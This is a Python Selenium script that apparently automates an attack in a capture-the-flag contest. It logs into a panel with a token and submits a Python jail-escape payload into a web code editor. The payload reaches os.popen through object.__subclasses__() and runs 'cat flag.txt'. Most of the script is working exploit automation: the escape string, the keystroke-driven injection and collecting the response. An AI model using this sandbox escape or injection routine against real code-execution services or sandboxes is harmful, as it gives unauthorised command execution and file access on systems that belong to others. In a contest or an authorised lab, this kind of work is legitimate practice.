from selenium.webdriver.chrome.options import Options
import time
from http.client import PAYMENT_REQUIRED
from selenium import webdriver
from selenium.webdriver.common.keys import Keys #send keys on keyboard

'''hault the page until it find some label appear on the page'''
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

'''imitate the action that human execute on mouse and keyboard'''
from selenium.webdriver.common.action_chains import ActionChains

'''to do some keyboard instruction-'''
import pyautogui
import time
import argparse

def parse_args():
    parser = argparse.ArgumentParser()
    '''ARM'''
    parser.add_argument('--team', type=str, default='1', help='team id.')

    return parser.parse_args()
    
def read_write_file(type, write_data = None):
    file_path = 'D:/Download/test.txt'
    if type == 'r':
        f = open(file_path, 'r', encoding="utf-8") #u must add encoding parameter
        arr = []
        for line in f.readlines():
            arr.append(line)
        f.close()
        return arr
    elif type == 'a':
        f = open(file_path, 'a', encoding='UTF-8')
        f.write(write_data + '\n')
        f.close()
    elif type == 'refresh':
        f = open(file_path, 'w', encoding='UTF-8')
        f.write('')
        f.close()

args = parse_args() 


from selenium.webdriver.support.wait import WebDriverWait
driver = webdriver.Chrome('D:/Download/chromedriver.exe')
driver.get("http://10.11.0.1:5001/panel")

token = '123'
payload = "print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('cat flag.txt').read())"


'''Login'''
text_input = driver.find_element(By.ID, "token")
ActionChains(driver).send_keys_to_element(text_input, token).perform()
driver.find_element(By.TAG_NAME, 'button').click()
time.sleep(5)

'''Choose which team'''
# from selenium.webdriver.support.ui import Select
# select = Select(driver.find_element(By.NAME, 'target'))
# select.select_by_index(0)
# from selenium.webdriver.common.keys import Keys
# for op in select.options:
#     if op.text != '--------passing_baseline_v2---------':
#         css_panel = driver.find_element(By.CLASS_NAME, "CodeMirror")
#         print(css_panel)
#         code_mirror_element = css_panel.find_element(By.XPATH, "/html/body/main/form[2]/p[2]/div/div[1]/textarea")
#         print(code_mirror_element)
#         code_mirror_element.send_keys(Keys.CONTROL + "a")
#     time.sleep(5)
#     print(op.text)

'''Send Payload'''
cursor = driver.find_element(By.XPATH, "//form[@id='jail-form']/p/div/div[6]")
cursor.click()
pyautogui.hotkey('ctrl','a')
pyautogui.hotkey('delete')
ActionChains(driver).send_keys_to_element(cursor, payload).perform()
time.sleep(5)  # Scrolled down by user
driver.find_element(By.XPATH, '/html/body/main/form/button').click()
time.sleep(5)

'''Catch Response & Write to file'''
print(driver.find_element(By.XPATH, '/html/body/div/div/div[2]'))
# read_write_file('a', 123)